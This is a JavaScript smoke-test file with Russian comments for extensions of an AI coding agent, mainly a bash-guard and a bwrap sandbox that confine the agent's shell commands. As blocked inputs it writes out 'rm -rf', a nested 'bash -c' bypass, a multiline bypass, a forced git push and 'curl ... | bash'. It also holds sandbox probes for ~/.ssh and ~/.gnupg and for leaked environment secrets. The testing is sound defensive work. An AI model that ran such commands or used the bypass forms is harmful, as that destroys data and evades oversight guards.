/**
 * Смоук-тест: загружает каждое расширение через jiti (как это делает сам pi)
 * со стаб-объектом ExtensionAPI и проверяет основные пути.
 * Запуск: node test/smoke.test.mjs
 */
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { createRequire } from "node:module";
import { createJiti } from "jiti";

const require = createRequire(import.meta.url);
const jiti = createJiti(fileURLToPath(import.meta.url));

const promptSnippets = jiti("../extensions/prompt-snippets/index.ts");
const bashGuard = jiti("../extensions/bash-guard/index.ts");
const askUserQuestion = jiti("../extensions/ask-user-question/index.ts");

const results = [];
async function check(name, fn) {
	try {
		await fn();
		results.push(`ok   ${name}`);
	} catch (e) {
		results.push(`FAIL ${name}: ${e?.message ?? e}`);
	}
}

// --- стаб ExtensionAPI ---
function makePi() {
	const handlers = {};
	const shortcuts = [];
	const commands = [];
	const flags = [];
	const tools = [];
	return {
		handlers, shortcuts, commands, flags, tools,
		on: (event, fn) => { handlers[event] = fn; },
		registerShortcut: (key, def) => shortcuts.push({ key, def }),
		registerCommand: (name, def) => commands.push({ name, def }),
		registerFlag: (name, def) => flags.push({ name, def }),
		registerTool: (def) => tools.push(def),
		getFlag: () => false,
	};
}

const noUiCtx = {
	hasUI: false,
	mode: "tui",
	ui: {
		notify: () => {},
		setWidget: () => {},
		setStatus: () => {},
		theme: { fg: (_c, s) => s, bg: (_c, s) => s, bold: (s) => s },
	},
};

// === 1. prompt-snippets ===
{
	const pi = makePi();
	promptSnippets.default(pi);
	await check("prompt-snippets: зарегистрированы alt+s и /snippets", () => {
		if (!pi.shortcuts.some((s) => s.key === "alt+s")) throw new Error("нет alt+s");
		if (!pi.commands.some((c) => c.name === "snippets")) throw new Error("нет /snippets");
	});
	await check("prompt-snippets: input без активных сниппетов не трансформирует", async () => {
		const handler = pi.handlers.input;
		if (!handler) throw new Error("нет обработчика input");
		const res = await handler({ text: "привет" }, noUiCtx);
		if (res !== undefined) throw new Error("ожидалось undefined, получили: " + JSON.stringify(res));
	});
	await check("prompt-snippets: session_start не роняет", async () => {
		await pi.handlers.session_start({ reason: "startup" }, noUiCtx);
	});
	await check("prompt-snippets: сниппеты на русском", () => {
		const dir = fileURLToPath(new URL("../extensions/prompt-snippets/snippets/", import.meta.url));
		const raw = readFileSync(dir + "verify-not-assume.md", "utf8");
		if (!raw.includes("Проверяй, не угадывай")) throw new Error("нет русского текста");
	});
}

// === 2. bash-guard ===
{
	const pi = makePi();
	bashGuard.default(pi);
	await check("bash-guard: зарегистрированы флаги и команда", () => {
		if (!pi.flags.some((f) => f.name === "bash-guard-disabled")) throw new Error("нет флага bash-guard-disabled");
		if (!pi.flags.some((f) => f.name === "bash-guard-auto-allow")) throw new Error("нет флага bash-guard-auto-allow");
		if (!pi.commands.some((c) => c.name === "bash-guard")) throw new Error("нет /bash-guard");
	});
	const toolHandler = pi.handlers.tool_call;
	if (!toolHandler) {
		results.push("FAIL bash-guard: нет обработчика tool_call");
	}
	await check("bash-guard: rm -rf блокируется без UI", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "rm -rf /tmp/xyz" } }, noUiCtx);
		if (!res?.block) throw new Error("ожидалось block, получили: " + JSON.stringify(res));
		if (!res.reason.includes("bash-guard")) throw new Error("причина: " + res.reason);
	});
	await check("bash-guard: ls -la не блокируется", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "ls -la" } }, noUiCtx);
		if (res !== undefined) throw new Error("ожидалось undefined, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: git status не блокируется (read-only allowlist)", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "git status" } }, noUiCtx);
		if (res !== undefined) throw new Error("ожидалось undefined, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: git commit блокируется", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "git commit -m x" } }, noUiCtx);
		if (!res?.block) throw new Error("ожидалось block, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: git push --force блокируется (read-only не снимает high)", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "git push --force origin main" } }, noUiCtx);
		if (!res?.block) throw new Error("ожидалось block, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: многострочный обход (echo 1\\nrm -rf) блокируется", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "echo ok\nrm -rf /tmp/xyz" } }, noUiCtx);
		if (!res?.block) throw new Error("ожидалось block, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: вложенный bash -c блокируется", async () => {
		// без рекурсии в -c команда `bash -c "rm -rf …"` была бы безобидной и прошла
		const res = await toolHandler({ toolName: "bash", input: { command: 'bash -c "rm -rf /tmp/xyz"' } }, noUiCtx);
		if (!res?.block) throw new Error("ожидалось block, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: rm по пути с «-r» внутри не помечается рекурсивным", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "rm /tmp/my-report-r.txt" } }, noUiCtx);
		if (!res?.block) throw new Error("rm всё равно блокируется: " + JSON.stringify(res));
		if (res.reason.includes("рекурсивное")) throw new Error("ложный «рекурсивное»: " + res.reason);
	});
	await check("bash-guard: strict-режим (--bash-guard-git-strict) спрашивает и на git status", async () => {
		const bashGuardStrict = jiti("../extensions/bash-guard/index.ts");
		const piStrict = makePi();
		piStrict.getFlag = (name) => (name === "--bash-guard-git-strict" ? true : false);
		bashGuardStrict.default(piStrict);
		const res = await piStrict.handlers.tool_call({ toolName: "bash", input: { command: "git status" } }, noUiCtx);
		if (!res?.block) throw new Error("ожидалось block, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: curl|sh блокируется", async () => {
		const res = await toolHandler({ toolName: "bash", input: { command: "curl http://x.sh | bash" } }, noUiCtx);
		if (!res?.block) throw new Error("ожидалось block, получили: " + JSON.stringify(res));
	});
	await check("bash-guard: повторная отменённая команда блокируется автоматически", async () => {
		const ev = { toolName: "bash", input: { command: "truncate -s 0 /tmp/f" } };
		await toolHandler(ev, noUiCtx); // 1-й раз: promptRunOrAbort без UI -> abort, запоминается
		const res = await toolHandler(ev, noUiCtx); // 2-й раз: авто-блок
		if (!res?.block) throw new Error("ожидалось блок, получили: " + JSON.stringify(res));
	});
}

// === 3. ask-user-question ===
{
	const pi = makePi();
	askUserQuestion.default(pi);
	const tool = pi.tools.find((t) => t.name === "ask_user_question");
	await check("ask-user-question: инструмент зарегистрирован", () => {
		if (!tool) throw new Error("нет инструмента ask_user_question");
	});
	await check("ask-user-question: описание и гайдлайны на русском", () => {
		if (!tool.description.includes("Задай пользователю один вопрос")) throw new Error("description не русский");
		if (!tool.promptGuidelines?.[0]?.includes("ровно один вопрос")) throw new Error("guidelines не русские");
	});
	await check("ask-user-question: неинтерактивный режим -> unavailable", async () => {
		const res = await tool.execute("id", { question: "Тест?" }, new AbortController().signal, () => {}, noUiCtx);
		if (res.details?.status !== "unavailable") throw new Error("ожидался unavailable: " + JSON.stringify(res.details));
	});
	await check("ask-user-question: aborted сигнал -> cancelled", async () => {
		const ac = new AbortController();
		ac.abort();
		const res = await tool.execute("id", { question: "Тест?" }, ac.signal, () => {}, noUiCtx);
		if (res.details?.status !== "cancelled") throw new Error("ожидался cancelled: " + JSON.stringify(res.details));
	});
	await check("ask-user-question: renderCall/renderResult не роняют", () => {
		const theme = { fg: (_c, s) => s, bold: (s) => s };
		const c = tool.renderCall({ question: "Вопрос?", options: [{ label: "Да" }] }, theme);
		if (!c) throw new Error("renderCall вернул пусто");
		const r = tool.renderResult({ content: [{ type: "text", text: "Пользователь выбрал: 1. Да" }] }, {}, theme);
		if (!r) throw new Error("renderResult вернул пусто");
	});
}


// === 4. graft ===
{
	// makePi.getFlag по умолчанию возвращает false — для graft нужны дефолты из registerFlag
	function makePi2() {
		const base = makePi();
		base.getFlag = (name) => {
			const f = base.flags.find((x) => x.name === name.replace(/^--/, ""));
			return f ? f.default : false;
		};
		return base;
	}
	const graftExt = jiti("../extensions/graft/index.ts");
	const pi = makePi2();
	graftExt.default(pi);

	// в корне проекта сейчас есть граф — берём пустой каталож
	const { mkdirSync: mkdirG, existsSync: existsG } = await import("node:fs");
	const noGraphDir = "/tmp/pi-ext-no-graft";
	mkdirG(noGraphDir, { recursive: true });
	const ctxNoGraph = { ...noUiCtx, cwd: noGraphDir }; // в нём графа нет

	await check("graft: 7 инструментов зарегистрированы", () => {
		for (const name of ["graft_ask", "graft_grep", "graft_callers", "graft_skeleton", "graft_map", "graft_check", "graft_blast"]) {
			if (!pi.tools.find((t) => t.name === name)) throw new Error("нет " + name);
		}
	});
	await check("graft: /graft-команда и флаги", () => {
		if (!pi.commands.some((c) => c.name === "graft")) throw new Error("нет /graft");
		if (!pi.flags.some((f) => f.name === "graft-push")) throw new Error("нет --graft-push");
		const push = pi.flags.find((f) => f.name === "graft-push");
		if (push.def.default !== true) throw new Error("push должен быть включён по умолчанию (parity с always-on после init)");
	});
	await check("graft: без графа — подсказка о graft build", async () => {
		const tool = pi.tools.find((t) => t.name === "graft_map");
		const res = await tool.execute("id", {}, new AbortController().signal, () => {}, ctxNoGraph);
		const text = res.content[0].text;
		if (!text.includes("graft build")) throw new Error("нет подсказки: " + text.slice(0, 120));
	});

	// Фикстура с графом
	const { existsSync, mkdirSync, writeFileSync, rmSync } = await import("node:fs");
	const { spawnSync } = await import("node:child_process");
	const fixture = "/tmp/pi-ext-graft-fixture";
	const engineBin = new URL("../engine/graft/bin/graft.mjs", import.meta.url).pathname;
	if (!existsSync(fixture + "/graft/.engine/graph.json")) {
		rmSync(fixture, { recursive: true, force: true });
		mkdirSync(fixture, { recursive: true });
		writeFileSync(fixture + "/a.ts", "export function auth(req: string): string { return \"ok-\" + req; }\nexport function handler(req: string) { return auth(req).toUpperCase(); }\n");
		const b = spawnSync("git", ["init", "-q"], { cwd: fixture });
		if (b.status !== 0) throw new Error("git init failed");
		const add = spawnSync("git", ["add", "-A"], { cwd: fixture });
		if (add.status !== 0) throw new Error("git add failed");
		const build = spawnSync(process.execPath, [engineBin, "build"], { cwd: fixture, timeout: 60000, encoding: "utf8" });
		if (build.status !== 0) throw new Error("graft build failed: " + (build.stdout || "").slice(-300));
	}
const ctxGraph = { ...noUiCtx, cwd: fixture };

	await check("graft: graft_map возвращает карту репо", async () => {
		const tool = pi.tools.find((t) => t.name === "graft_map");
		const res = await tool.execute("id", {}, new AbortController().signal, () => {}, ctxGraph);
		const text = res.content[0].text;
		if (!text.includes("repo map")) throw new Error("нет 'repo map': " + text.slice(0, 200));
	});
	await check("graft: graft_ask находит символы", async () => {
		const tool = pi.tools.find((t) => t.name === "graft_ask");
		const res = await tool.execute("id", { query: "where is auth" }, new AbortController().signal, () => {}, ctxGraph);
		const text = res.content[0].text;
		if (!text.includes("auth")) throw new Error("нет 'auth': " + text.slice(0, 200));
	});
	await check("graft: graft_callers находит зависимых", async () => {
		const tool = pi.tools.find((t) => t.name === "graft_callers");
		const res = await tool.execute("id", { symbol: "auth" }, new AbortController().signal, () => {}, ctxGraph);
		const text = res.content[0].text;
		if (!text.includes("handler")) throw new Error("нет 'handler': " + text.slice(0, 200));
	});
	await check("graft: before_agent_start ставит секцию <graft> с картой", async () => {
		const sections = {};
		await pi.handlers.before_agent_start({ prompt: "fix auth bug", systemPromptOptions: { sections } }, ctxGraph);
		if (!sections.graft || !sections.graft.includes("repo map")) throw new Error("секция не установлена: " + JSON.stringify(Object.keys(sections)));
	});
	await check("graft: tool_result (write) дописывает blast radius", async () => {
		// правка a.ts (unstaged) → в diff попадает строка auth → зависимость handler
		const { readFileSync, writeFileSync: wf } = await import("node:fs");
		wf(fixture + "/a.ts", readFileSync(fixture + "/a.ts", "utf8") + "\n// touch\n");
		const res = await pi.handlers.tool_result({ isError: false, toolName: "write", input: { path: "a.ts" }, content: [{ type: "text", text: "written" }] }, ctxGraph);
		if (!res) throw new Error("ожидался результат с blast radius");
		const texts = res.content.map((c) => c.text).join("\n");
		if (!texts.includes("blast radius")) throw new Error("нет blast: " + texts.slice(0, 300));
	});
	// v2.6: push-гейт/dedup, compliance, метрики, MCP instructions
	const makePiFlags = (overrides) => {
		const base = makePi();
		base.getFlag = (name) => {
			const f = base.flags.find((x) => x.name === name.replace(/^--/, ""));
			return overrides[name] ?? (f ? f.default : false);
		};
		return base;
	};
	const ctxGraft = jiti("../extensions/graft/index.ts");
	const piPush = makePiFlags({ "--graft-push": true });
	ctxGraft.default(piPush);

	await check("graft push: гейт релевантности (короткий промпт → без пакета)", async () => {
		const sections = {};
		await piPush.handlers.before_agent_start({ prompt: "ок", systemPromptOptions: { sections } }, ctxGraph);
		if (sections.graft && sections.graft.includes("Top-хиты")) throw new Error("пакет на короткий промпт: " + sections.graft.slice(0, 200));
	});

	await check("graft push: дедуп по сессии (второй раз — только новые id)", async () => {
		const sections1 = {};
		await piPush.handlers.before_agent_start({ prompt: "fix the auth bug in handler", systemPromptOptions: { sections: sections1 } }, ctxGraph);
		if (!sections1.graft || !sections1.graft.includes("Указатели графа")) throw new Error("нет пакета: " + JSON.stringify(sections1.graft ?? null).slice(0, 200));
		if (!/a\.ts:L\d+-L\d+\s+auth/.test(sections1.graft)) throw new Error("нет указателя file:line: " + sections1.graft.slice(0, 300));
		if (sections1.graft.includes("export function")) throw new Error("сниппет в пакете (должен быть только указатель): " + sections1.graft.slice(0, 300));
		const sections2 = {};
		await piPush.handlers.before_agent_start({ prompt: "fix the auth bug in handler", systemPromptOptions: { sections: sections2 } }, ctxGraph);
		if (sections2.graft && sections2.graft.includes("Указатели графа")) throw new Error("повторный пакет: " + sections2.graft.slice(0, 200));
	});

	await check("graft compliance: turn_end без 🌱 → напоминание в след. секции", async () => {
		await pi.handlers.turn_end(
			{
				turnIndex: 0,
				message: { content: [{ type: "text", text: "готово, без эмодзи" }] },
				toolResults: [{ toolName: "graft_ask", content: [{ type: "text", text: "[graft] tokens saved ≈ 500\ngraft ask: ..." }] }],
			},
			ctxGraph,
		);
		const s1 = {};
		await pi.handlers.before_agent_start({ prompt: "продолжи работу над кодом проекта", systemPromptOptions: { sections: s1 } }, ctxGraph);
		if (!s1.graft || !s1.graft.includes("Напоминание")) throw new Error("нет напоминания: " + JSON.stringify(s1.graft ?? null).slice(0, 300));
		const s2 = {};
		await pi.handlers.before_agent_start({ prompt: "ещё один промпт для проверки кэша", systemPromptOptions: { sections: s2 } }, ctxGraph);
		if (s2.graft && s2.graft.includes("Напоминание")) throw new Error("напоминание не разовое: " + s2.graft.slice(0, 300));
	});

	await check("graft метрики: вызов тула пишет ~/.local/state (GRFT_STATE_DIR)", async () => {
		const { mkdtempSync, readFileSync: rf, existsSync: ex } = await import("node:fs");
		const { tmpdir } = await import("node:os");
		const state = mkdtempSync(tmpdir() + "/pi-graft-state-");
		const prev = process.env.GRFT_STATE_DIR;
		process.env.GRFT_STATE_DIR = state;
		try {
			const tool = pi.tools.find((t) => t.name === "graft_ask");
			await tool.execute("id", { query: "auth symbol" }, new AbortController().signal, () => {}, { ...ctxGraph, sessionManager: { getSessionId: () => "smoke-sid" } });
			const f = state + "/smoke-sid.json";
			if (!ex(f)) throw new Error("нет файла метрик: " + f);
			const m = JSON.parse(rf(f, "utf8"));
			if (m.calls < 1 || typeof m.tokens !== "number") throw new Error("плохие метрики: " + JSON.stringify(m));
		} finally {
			if (prev === undefined) delete process.env.GRFT_STATE_DIR;
			else process.env.GRFT_STATE_DIR = prev;
		}
	});

	await check("graft stats: /graft stats — сводка экономии по периодам", async () => {
		const { mkdtempSync, writeFileSync: wf3 } = await import("node:fs");
		const { tmpdir: tmpd } = await import("node:os");
		const state = mkdtempSync(tmpd + "/pi-graft-stats-");
		const now = Date.now();
		const D = 86_400_000;
		wf3(state + "/t0.json", JSON.stringify({ calls: 5, tokens: 1000, ts: now }));
		wf3(state + "/t6.json", JSON.stringify({ calls: 10, tokens: 5000, ts: now - 6 * D }));
		wf3(state + "/t40.json", JSON.stringify({ calls: 50, tokens: 90000, ts: now - 40 * D }));
		wf3(state + "/bad.json", "{не json");
		const prev = process.env.GRFT_STATE_DIR;
		process.env.GRFT_STATE_DIR = state;
		let notified = "";
		const ctxCap = { ...ctxGraph, ui: { ...noUiCtx.ui, notify: (m) => { notified += m + "\n"; } } };
		const cmd = pi.commands.find((c) => c.name === "graft").def;
		try {
			await cmd.handler("stats", ctxCap);
		} finally {
			if (prev === undefined) delete process.env.GRFT_STATE_DIR;
			else process.env.GRFT_STATE_DIR = prev;
		}
		if (!notified.includes("Сводка экономии")) throw new Error("нет заголовка: " + notified.slice(0, 300));
		const week = notified.match(/7 дн[а-я]*: (\d+) вызов[а-я]*, ≈([\d,]+) токенов/);
		if (!week || week[1] !== "15" || week[2] !== "6,000") throw new Error("неверные 7 дней: " + (week ? week.join(" ") : notified.slice(0, 300)));
		const total = notified.match(/Всего: (\d+) вызов[а-я]*, ≈([\d,]+) токенов/);
		if (!total || total[1] !== "65" || total[2] !== "96,000") throw new Error("неверный итог: " + (total ? total.join(" ") : notified.slice(0, 300)));
	});

	await check("graft push: coverage-гейт — слабые хиты дают нудж один раз, дальше тишина", async () => {
		// "toUpperCase" есть в сниппете handler → хиты есть, но в имени/пути их нет → weak.
		const s1 = {};
		await piPush.handlers.before_agent_start({ prompt: "toUpperCase in a.ts file", systemPromptOptions: { sections: s1 } }, ctxGraph);
		if (!s1.graft || !s1.graft.includes("не дал сильного совпадения")) throw new Error("нет нуджа: " + JSON.stringify(s1.graft ?? null).slice(0, 200));
		const s2 = {};
		await piPush.handlers.before_agent_start({ prompt: "toUpperCase again near the request path", systemPromptOptions: { sections: s2 } }, ctxGraph);
		if (s2.graft && s2.graft.includes("не дал сильного совпадения")) throw new Error("нудж повторился: " + s2.graft.slice(0, 200));
	});

	await check("graft tally: 🌱-доля пишется в метрики на turn_end", async () => {
		const { mkdtempSync } = await import("node:fs");
		const { tmpdir: tmpd } = await import("node:os");
		const state = mkdtempSync(tmpd + "/pi-graft-tally-");
		const prev = process.env.GRFT_STATE_DIR;
		process.env.GRFT_STATE_DIR = state;
		const ctxSid = { ...ctxGraph, sessionManager: { getSessionId: () => "tally-sid" } };
		try {
			const ev = (text) => ({ turnIndex: 0, message: { content: [{ type: "text", text }] }, toolResults: [{ toolName: "graft_ask", content: [{ type: "text", text: "[graft] tokens saved ≈ 900\ngraft ask: x" }] }] });
			await pi.handlers.turn_end(ev("готово, без эмодзи"), ctxSid);
			await pi.handlers.turn_end(ev("готово. 🌱 graft saved ~900 tokens (1 call)"), ctxSid);
			const { readFileSync: rf2 } = await import("node:fs");
			const m = JSON.parse(rf2(state + "/tally-sid.json", "utf8"));
			if (m.graftTurns !== 2 || m.reportedTurns !== 1) throw new Error("tally неверный: " + JSON.stringify(m));
		} finally {
			if (prev === undefined) delete process.env.GRFT_STATE_DIR;
			else process.env.GRFT_STATE_DIR = prev;
		}
	});

	await check("graft mcp: initialize отдаёт instructions с экономикой", async () => {
		const { spawn } = await import("node:child_process");
		const bin = new URL("../engine/graft/bin/graft-mcp.mjs", import.meta.url).pathname;
		const p = spawn(process.execPath, [bin], { env: { ...process.env, GRFT_MCP_ROOT: fixture } });
		let buf = "";
		await new Promise((res) => {
			p.stdout.on("data", (d) => { buf += d.toString(); if (buf.includes("\n")) res(); });
			setTimeout(res, 5000);
		});
		p.stdin.write(JSON.stringify({ jsonrpc: "2.0", id: 1, method: "initialize", params: {} }) + "\n");
		await new Promise((res) => {
			p.stdout.on("data", (d) => { buf += d.toString(); if (buf.includes("instructions")) res(); });
			setTimeout(res, 5000);
		});
		p.kill();
		const line = buf.split("\n").find((l) => l.includes("instructions"));
		if (!line) throw new Error("нет instructions: " + buf.slice(0, 200));
		if (!line.includes("tokens saved")) throw new Error("instructions без экономики: " + line.slice(0, 200));
	});
}


// === 5. sandbox ===
{
	const sbxExt = jiti("../extensions/sandbox/index.ts");
	const pi = makePi();
	sbxExt.default(pi);

	const { mkdirSync, writeFileSync, existsSync } = await import("node:fs");
	const { execFileSync, execFile } = await import("node:child_process");

	// Фикстура-проект (НЕ в /tmp: bwrap маскирует /tmp свежим tmpfs)
	const fixture = "/home/arkalaust/pi-sbx-fixture";
	if (!existsSync(fixture + "/.git")) {
		mkdirSync(fixture, { recursive: true });
		execFileSync("git", ["init", "-q"], { cwd: fixture });
	}
	writeFileSync(fixture + "/.sandbox", "dev\n");
	const ctxSbx = { ...noUiCtx, cwd: fixture };

	await check("sandbox: .sandbox=dev оборачивает bash-команду в bwrap", async () => {
		const ev = { toolName: "bash", input: { command: "echo hello-sbx" } };
		await pi.handlers.tool_call(ev, ctxSbx);
		if (!String(ev.input.command).includes("bwrap")) throw new Error("не обёрнуто: " + String(ev.input.command).slice(0, 120));
		if (!ev.__sandboxWrapped) throw new Error("нет маркера __sandboxWrapped");
	});

	async function runWrapped(command, cwd) {
		const ev = { toolName: "bash", input: { command } };
		await pi.handlers.tool_call(ev, { ...noUiCtx, cwd });
		return await new Promise((res) =>
			execFile("bash", ["-c", ev.input.command], { timeout: 60000, maxBuffer: 1024 * 1024 }, (e, so, se) =>
				res(((so || "") + (se ? "\n" + se : "")).trim()),
			),
		);
	}

	await check("sandbox: home/секреты скрыты, workspace rw (e2e)", async () => {
		const out = await runWrapped(
			'ls -A /home/arkalaust 2>/dev/null | tr "\n" " " | grep -qE "\.(ssh|gnupg)" && echo SECRETS-VISIBLE || echo SECRETS-HIDDEN; ls /home/arkalaust/.ssh >/dev/null 2>&1 && echo SSH-VISIBLE || echo SSH-HIDDEN; ls /home/arkalaust/Code >/dev/null 2>&1 && echo CODE-VISIBLE || echo CODE-HIDDEN; touch "' + fixture + '/.wtest" && echo WS-RW || echo WS-FAIL; rm -f "' + fixture + '/.wtest"',
			fixture,
		);
		if (!out.includes("SECRETS-HIDDEN")) throw new Error("секретные home-каталоги видны: " + out);
		if (!out.includes("SSH-HIDDEN")) throw new Error("ssh виден: " + out);
		if (!out.includes("CODE-HIDDEN")) throw new Error("другие проекты видны: " + out);
		if (!out.includes("WS-RW")) throw new Error("workspace не rw: " + out);
	});

	await check("sandbox: секреты env не попадают в песочницу", async () => {
		process.env.FAKE_API_KEY_SANDBOX_TEST = "secret123";
		const out = await runWrapped("env | grep -c FAKE_API_KEY_SANDBOX_TEST || true", fixture);
		if (!out.trim().startsWith("0")) throw new Error("секрет виден: " + out);
		delete process.env.FAKE_API_KEY_SANDBOX_TEST;
	});

	await check("sandbox: untrusted блокирует сеть (e2e)", async () => {
		writeFileSync(fixture + "/.sandbox", "untrusted\n");
		const out = await runWrapped("timeout 6 curl -sI https://1.1.1.1 >/dev/null 2>&1 && echo NET-OK || echo NET-BLOCKED", fixture);
		if (!out.includes("NET-BLOCKED")) throw new Error("сеть жива: " + out);
		writeFileSync(fixture + "/.sandbox", "dev\n");
	});

	await check("sandbox: vm-уровень блокирует bash с инструкцией", async () => {
		const piVm = makePi();
		piVm.getFlag = (name) => (name === "--sandbox-level" ? "vm" : false);
		sbxExt.default(piVm);
		const res = await piVm.handlers.tool_call({ toolName: "bash", input: { command: "echo x" } }, ctxSbx);
		if (!res?.block || !res.reason.includes("vm")) throw new Error("нет блока: " + JSON.stringify(res));
	});

	await check("sandbox: без маркера — passthrough", async () => {
		const plain = "/home/arkalaust/pi-sbx-fixture-plain";
		if (!existsSync(plain + "/.git")) {
			mkdirSync(plain, { recursive: true });
			execFileSync("git", ["init", "-q"], { cwd: plain });
		}
		const ev = { toolName: "bash", input: { command: "echo plain" } };
		await pi.handlers.tool_call(ev, { ...noUiCtx, cwd: plain });
		if (ev.input.command !== "echo plain") throw new Error("команду тронули: " + ev.input.command);
	});
}


// === 6. sandbox: trust prompt (project_trust + session_start fallback) ===
{
	const { unlinkSync, readFileSync: rfs } = await import("node:fs");
	const trustFile = "/tmp/pi-sbx-trust-test.json";
	const cleanStore = () => { try { unlinkSync(trustFile); } catch {} };
	process.env.PI_SANDBOX_TRUST_FILE = trustFile;

	const plain = "/home/arkalaust/pi-sbx-fixture-plain"; // без .sandbox
	const mkCtx = (cwd) => ({
		hasUI: true,
		cwd,
		mode: "default",
		signal: new AbortController().signal,
		ui: {
			theme: { fg: (_c, t) => t, bold: (t) => t, bg: (_c, t) => t },
			setStatus: () => {},
			notify: () => {},
			select: async () => undefined,
		},
	});

	await check("sandbox-trust: project_trust без маркера спрашивает уровень и запоминает", async () => {
		cleanStore();
		const sbxExt2 = jiti("../extensions/sandbox/index.ts");
		const pi2 = makePi();
		sbxExt2.default(pi2);
		let calls = 0;
		const ctxT = mkCtx(plain);
		ctxT.ui.select = async (_t, opts) => { calls++; return opts[2]; };
		const res = await pi2.handlers.project_trust({ type: "project_trust", cwd: plain }, ctxT);
		if (calls !== 1) throw new Error("select не вызван: " + calls);
		if (res.trusted !== "no" || res.remember !== true) throw new Error("неверный результат: " + JSON.stringify(res));
		const store = JSON.parse(rfs(trustFile, "utf8"));
		if (store[plain]?.level !== "untrusted") throw new Error("не сохранено: " + JSON.stringify(store));
	});

	await check("sandbox-trust: сохранённое решение — без вопроса, уровень применяется", async () => {
		const sbxExt3 = jiti("../extensions/sandbox/index.ts");
		const pi3 = makePi();
		sbxExt3.default(pi3);
		let calls = 0;
		const ctxT = mkCtx(plain);
		ctxT.ui.select = async () => { calls++; return "x"; };
		const res = await pi3.handlers.project_trust({ type: "project_trust", cwd: plain }, ctxT);
		if (calls !== 0) throw new Error("спросил повторно");
		if (res.trusted !== "no") throw new Error("неверный trust: " + JSON.stringify(res));
		const ev = { toolName: "bash", input: { command: "echo x" } };
		await pi3.handlers.tool_call(ev, { ...noUiCtx, cwd: plain });
		if (!String(ev.input.command).includes("unshare-net")) throw new Error("не untrusted: " + String(ev.input.command).slice(0, 150));
	});

	await check("sandbox-trust: маркер .sandbox — промпт не показывается", async () => {
		const sbxExt4 = jiti("../extensions/sandbox/index.ts");
		const pi4 = makePi();
		sbxExt4.default(pi4);
		let calls = 0;
		const fixture = "/home/arkalaust/pi-sbx-fixture"; // .sandbox = dev
		const ctxT = mkCtx(fixture);
		ctxT.ui.select = async () => { calls++; return "x"; };
		const res = await pi4.handlers.project_trust({ type: "project_trust", cwd: fixture }, ctxT);
		if (calls !== 0) throw new Error("спросил при маркере");
		if (res.trusted !== "yes") throw new Error("dev должен быть yes: " + JSON.stringify(res));
	});

	await check("sandbox-trust: session_start-фолбэк спрашивает при первом старте, не спрашивает при resume", async () => {
		cleanStore();
		const sbxExt5 = jiti("../extensions/sandbox/index.ts");
		const pi5 = makePi();
		sbxExt5.default(pi5);
		let calls = 0;
		const ctxS = mkCtx(plain);
		ctxS.ui.select = async (_t, opts) => { calls++; return opts[1]; };
		await pi5.handlers.session_start({ type: "session_start", reason: "startup" }, ctxS);
		if (calls !== 1) throw new Error("select не вызван: " + calls);
		const store = JSON.parse(rfs(trustFile, "utf8"));
		if (store[plain]?.level !== "dev") throw new Error("не сохранено: " + JSON.stringify(store));
		const ctxS2 = mkCtx(plain);
		ctxS2.ui.select = async () => { calls++; return "x"; };
		await pi5.handlers.session_start({ type: "session_start", reason: "resume" }, ctxS2);
		if (calls !== 1) throw new Error("спросил при resume: " + calls);
	});

	delete process.env.PI_SANDBOX_TRUST_FILE;
}


// === 7. session-insights (skills) ===
{
	const { spawnSync } = await import("node:child_process");
	const script = fileURLToPath(new URL("../skills/session-insights/scripts/insights.py", import.meta.url));

	await check("session-insights: insights.py --json валиден", async () => {
		const r = spawnSync("python3", [script, "--since", "90d", "--json"], { encoding: "utf8", timeout: 120000 });
		if (r.status !== 0) throw new Error("exit " + r.status + ": " + (r.stderr || "").slice(0, 200));
		const d = JSON.parse(r.stdout);
		for (const k of ["totals", "sessions_top", "tool_errors", "max_tool_output_chars", "repeated_prompt_lines", "prompt_keywords"]) {
			if (!(k in d)) throw new Error("нет ключа " + k);
		}
		if (!Number.isInteger(d.totals.sessions) || d.totals.sessions <= 0) throw new Error("sessions = " + d.totals.sessions);
	});

	await check("session-insights: sessions.summarize_session парсит реальную сессию", async () => {
		const lib = fileURLToPath(new URL("../skills/session-insights/scripts/sessions.py", import.meta.url));
		const r = spawnSync("python3", [
			"-c",
			`import sys, os; sys.path.insert(0, os.path.dirname(sys.argv[1])); import sessions as S
from pathlib import Path
found = 0
for p in S.iter_session_files(include_subagents=False):
    s = S.summarize_session(p)
    if s and s.message_count >= 10:
        assert s.id and s.cwd, p
        assert s.tool_result_count >= 0 and s.error_count >= 0
        found += 1
assert found > 0, "нет сессий с сообщениями"
print(found)`,
			lib,
		], { encoding: "utf8", timeout: 120000 });
		if (r.status !== 0) throw new Error((r.stderr || "").slice(0, 300));
	});
}

// === 8. gen-speed ===
{
	const genSpeed = jiti("../extensions/gen-speed/index.ts");
	const piG = makePi();
	genSpeed.default(piG);

	// ctx в стиле TUI: футер устанавливается через setFooter
	let footerFactory = null;
	let lastTheme = null;
	const themeStub = { fg: (c, s) => `[${c}]${s}`, bold: (s) => `*${s}*` };
	const ctxG = {
		hasUI: true,
		mode: "tui",
		cwd: "/home/arkalaust/Code/AGENTS/pi-extensions",
		model: { id: "test-model", contextWindow: 200000, reasoning: true },
		thinkingLevel: "medium",
		getContextUsage: () => ({ tokens: 48000, contextWindow: 200000, percent: 24 }),
		sessionManager: {
			getEntries: () => [
				{
					type: "message",
					message: {
						role: "assistant",
						usage: { input: 30000, output: 18000, cacheRead: 0, cacheWrite: 0, totalTokens: 48000, cost: { total: 0.5 } },
						stopReason: "stop",
					},
				},
			],
			getSessionName: () => "test-session",
			getCwd: () => "/home/arkalaust/Code/AGENTS/pi-extensions",
		},
		ui: { setFooter: (f) => { footerFactory = f; } },
	};
	const tuiStub = { requestRender: () => {} };
	const footerDataStub = {
		getGitBranch: () => "master",
		getExtensionStatuses: () => new Map([["graft", "graft: ok"]]),
